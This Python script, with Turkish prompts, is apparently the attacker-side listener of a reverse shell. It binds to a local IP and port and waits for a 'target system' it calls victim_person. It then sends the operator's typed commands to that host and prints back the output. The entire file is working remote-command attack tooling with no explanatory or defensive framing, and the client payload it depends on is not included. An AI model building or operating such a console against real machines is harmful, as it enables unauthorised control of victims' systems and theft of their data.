#! /usr/bin/env python
# encoding:utf-8
import socket
import subprocess

socket_connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

socket_connection.bind(("192.168.1.106", 7171))
socket_connection.listen(1)

print("Hedef sistemin bağlantı kurması bekleniyor...")
victim_person, ip=socket_connection.accept()
print("Hedef sistem ile bağlantı sağlandı.")
print("Hedef sistem bilgileri : %s" % str(ip))
print("[0] ==> Programı Sonlandır")

while True:
    message = input("Komut Gir : ")
    encode_message = message.encode()
    victim_person.send(encode_message)

    if message == "0":
        print("Sunucu Kapatıldı.")
        break

    else:
        result = victim_person.recv(2048)
        decode_result = result.decode()
        print(decode_result)

socket_connection.close()